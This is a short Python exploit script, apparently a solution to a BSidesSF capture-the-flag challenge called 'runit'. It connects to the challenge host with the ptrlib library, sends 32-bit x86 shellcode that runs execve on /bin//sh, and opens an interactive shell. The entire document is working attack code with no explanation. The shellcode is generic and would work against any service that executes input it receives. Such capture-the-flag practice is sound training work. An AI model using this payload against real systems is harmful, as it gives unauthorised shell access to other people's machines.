from ptrlib import *
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"
sock = Socket("runit-5094b2cb.challenges.bsidessf.net", 5252)

sock.sendline(shellcode)
sock.interactive()
